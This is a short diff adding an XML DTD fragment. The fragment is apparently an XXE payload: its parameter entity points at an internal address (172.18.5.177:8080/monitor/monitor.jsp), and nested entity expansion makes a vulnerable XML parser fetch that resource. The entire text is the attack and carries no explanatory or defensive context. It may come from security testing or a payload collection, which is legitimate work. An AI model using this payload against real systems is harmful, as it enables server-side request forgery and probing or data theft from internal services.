@@ -1,0 +1,4 @@
+<!ENTITY % cfga SYSTEM "http://172.18.5.177:8080/monitor/monitor.jsp">
+<!ENTITY % eea "<!ENTITY &#x25; lobsterdata SYSTEM '#%cfga;'>">
+%eea;
+%lobsterdata;
